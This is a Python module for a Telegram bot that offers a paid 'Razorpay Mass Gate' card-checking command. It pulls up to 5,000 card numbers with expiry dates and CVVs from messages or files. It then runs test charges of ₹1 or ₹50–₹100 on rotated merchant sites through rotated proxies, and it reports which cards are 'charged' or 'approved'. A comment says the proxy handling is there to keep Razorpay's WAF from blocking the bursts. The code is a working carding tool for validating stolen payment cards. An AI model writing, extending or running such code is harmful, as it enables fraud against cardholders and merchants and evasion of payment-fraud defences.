import asyncio
import re
import time
import random
import os
import json
import itertools
import threading
import urllib.request
import urllib.parse
from datetime import datetime

from aiogram import types, F, Router

from database import is_gate_enabled, get_user_credits, is_owner_user
from sub import get_premium_status
from mass_gates._batch_common import run_batch_check, handle_result_callback, handle_stop_callback, show_selection
from mass_gates._tg_helpers import safe_reply
from mass_gates.msh import get_user_proxies

router = Router()

# ── Razorpay API (hosted on the VPS, port 9000) ──────────────────────────
RZ_API = os.environ.get("RZ_API", "http://127.0.0.1:9000")
SITES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rz_site.txt")
MAX_VALID_CARDS = 5000
REGION = "IN"

# module-level state consumed by check_fn (thread-safe rotation via itertools.count)
_sites = []
_proxies = []
_amount_paise = 100  # ₹1 default, overridden per command
_site_ctr = itertools.count()
_proxy_ctr = itertools.count()


def load_sites():
    try:
        with open(SITES_FILE, encoding="utf-8") as f:
            return [l.strip() for l in f if l.strip().startswith("http")]
    except Exception:
        return []


def luhn_check(card_number):
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    rd = card_number[::-1]
    for i, ch in enumerate(rd):
        d = int(ch)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def is_expired(mm, yy):
    try:
        now = datetime.now()
        cy = now.year % 100
        cm = now.month
        ey, em = int(yy), int(mm)
        if ey < cy:
            return True
        if ey == cy and em < cm:
            return True
        return False
    except ValueError:
        return True


def extract_cards(text):
    pattern = r'(\d{13,19})\s*[|/\\:\s]\s*(\d{1,2})\s*[|/\\:\s]\s*(\d{2,4})\s*[|/\\:\s]\s*(\d{3,4})'
    cards = []
    for m in re.findall(pattern, text):
        cc, mm, yy, cvv = m
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards


def _next_site():
    global _sites
    if not _sites:
        _sites = load_sites()
    if not _sites:
        return None
    return _sites[next(_site_ctr) % len(_sites)]


_proxy_locks = {}
_proxy_locks_guard = threading.Lock()


def _next_proxy():
    global _proxies
    if not _proxies:
        return None
    return _proxies[next(_proxy_ctr) % len(_proxies)]


def _proxy_lock(proxy):
    with _proxy_locks_guard:
        if proxy not in _proxy_locks:
            _proxy_locks[proxy] = threading.Lock()
        return _proxy_locks[proxy]


def _acquire_free_proxy():
    """Pick a proxy that is NOT currently in-flight. 1 request per IP keeps
    Razorpay's WAF from 403-ing on concurrent bursts from a single exit."""
    global _proxies
    n = len(_proxies)
    if n == 0:
        return None, None
    for _ in range(n):
        candidate = _proxies[next(_proxy_ctr) % n]
        lock = _proxy_lock(candidate)
        if lock.acquire(blocking=False):
            return candidate, lock
    candidate = _proxies[next(_proxy_ctr) % n]
    lock = _proxy_lock(candidate)
    lock.acquire()
    return candidate, lock


def check_fn(card):
    """Sync single-card check against the Razorpay API (VPS:9000). Returns (status, msg, brand)."""
    site = _next_site()
    if not site:
        return "ERROR", "No sites loaded (rz_site.txt empty)", "UNKNOWN"
    proxy, lock = _acquire_free_proxy()
    if proxy is None:
        return "ERROR", "No proxies loaded", "UNKNOWN"
    try:
        q = urllib.parse.urlencode({
            "cc": card,
            "site": site,
            "proxy": proxy,
            "amount": _amount_paise,
            "region": REGION,
        })
        url = f"{RZ_API}/razorpay?{q}"
        try:
            resp = urllib.request.urlopen(url, timeout=180)
            data = json.loads(resp.read().decode())
        except Exception as e:
            return "ERROR", f"API: {str(e)[:80]}", "UNKNOWN"
        status = str(data.get("status") or "error").lower()
        msg = data.get("message") or data.get("reason") or "N/A"
        if status == "charged":
            return "CHARGED", msg, "CHARGED"
        if status == "approved":
            return "APPROVED", msg, "APPROVED"
        if status == "dead":
            return "DECLINED", msg, "UNKNOWN"
        return "ERROR", msg, "UNKNOWN"
    finally:
        lock.release()


@router.message(F.text.startswith("/mrz") | F.caption.startswith("/mrz"))
async def mrz_command(message: types.Message):
    global _amount_paise, _proxies, _sites

    if not await asyncio.to_thread(is_gate_enabled, "mrz"):
        await safe_reply(message, "🚧 <b>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_premium:
        await safe_reply(message,
            "💎 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗴𝗿𝗮𝗱𝗲 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗳𝗲𝗮𝘁𝘂𝗿𝗲.\n\n👉 𝗨𝘀𝗲 /plan 𝘁𝗼 𝘂𝗽𝗴𝗿𝗮𝗱𝗲.",
            parse_mode="HTML")
        return

    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "
    if message.reply_to_message:
        rm = message.reply_to_message
        if rm.text:
            raw_text += rm.text + " "
        elif rm.caption:
            raw_text += rm.caption + " "

    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document
    if document:
        try:
            fi = await message.bot.get_file(document.file_id)
            data = await message.bot.download_file(fi.file_path)
            raw_text += data.read().decode('utf-8', errors='ignore')
        except Exception as e:
            await safe_reply(message, f"❌ Error reading file: {e}")
            return

    # amount override: amount=X (rupees) — else random ₹50–₹100
    amt_match = re.search(r'amount\s*=\s*(\d+)', raw_text, re.I)
    if amt_match:
        _amount_paise = int(amt_match.group(1)) * 100
        raw_text = raw_text[:amt_match.start()] + " " + raw_text[amt_match.end():]
    else:
        _amount_paise = random.randint(5000, 10000)

    if not raw_text.strip():
        await safe_reply(message,
            "❌ <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
            "• <code>/mrz cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/mrz</code>\n"
            "• Send .txt file with <code>/mrz</code>\n"
            "• Add <code>amount=75</code> to override amount",
            parse_mode="HTML")
        return

    extracted = extract_cards(raw_text)
    valid = []
    for c in extracted:
        cc, mm, yy, cvv = c.split('|')
        if luhn_check(cc) and not is_expired(mm, yy):
            valid.append(c)
        if len(valid) >= MAX_VALID_CARDS:
            break

    if not valid:
        await safe_reply(message, "❌ No valid cards to check.", parse_mode="HTML")
        return

    _proxies = await get_user_proxies(user_id)
    if not _proxies:
        await safe_reply(message, "⚠️ <b>𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀!</b>\nLoad with /proxy.", parse_mode="HTML")
        return
    _sites = load_sites()

    total = len(valid)
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits < total:
        await safe_reply(message,
            f"❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
            f"You need <b>{total}</b> credits to check <b>{total}</b> cards.\n"
            f"Your balance: <b>{current_credits}</b> credits.",
            parse_mode="HTML")
        return

    plan_name = "OWNER" if is_owner_user(user_id) else ("PREMIUM" if is_premium else "FREE")

    await show_selection(message, valid, check_fn, f"𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲 𝐌𝐚𝐬𝐬 (₹{_amount_paise // 100})", user_id, user, "mrz", plan_name)


@router.callback_query(F.data.startswith("mrz_res_"))
async def mrz_result_handler(callback: types.CallbackQuery):
    await handle_result_callback(callback)


@router.callback_query(F.data.startswith("mrz_stop_"))
async def mrz_stop_handler(callback: types.CallbackQuery):
    await handle_stop_callback(callback)
